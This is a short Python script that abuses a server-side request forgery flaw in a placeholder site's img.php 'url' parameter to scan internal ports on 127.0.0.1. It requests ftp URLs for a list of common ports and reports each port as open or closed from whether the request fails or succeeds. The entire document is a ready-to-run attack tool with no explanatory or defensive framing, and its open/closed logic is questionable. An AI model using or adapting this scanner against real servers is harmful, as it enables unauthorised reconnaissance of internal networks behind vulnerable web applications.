import requests
from termcolor import colored

url = "http://xxx.com/img.php?url=ftp://127.0.0.1:[port]/.jpg"

port_list = [21,23,25,53,67,69,79,80,8080,3389,4000]

def SSRF_TEST(url,port_list):
    for port in port_list:
        test_url = url.replace("[port]",str(port))
        try:
            result = requests.get(test_url,timeout=1)
        except requests.RequestException:
            print(colored('[*]', 'green'), "port %s" % port, colored("open", "green"))
        else:
            print(colored('[!]', 'red'), "port %s" % port, colored("closed", "red"))
        finally:
            test_url = url

if __name__ == "__main__":
    SSRF_TEST(url,port_list)
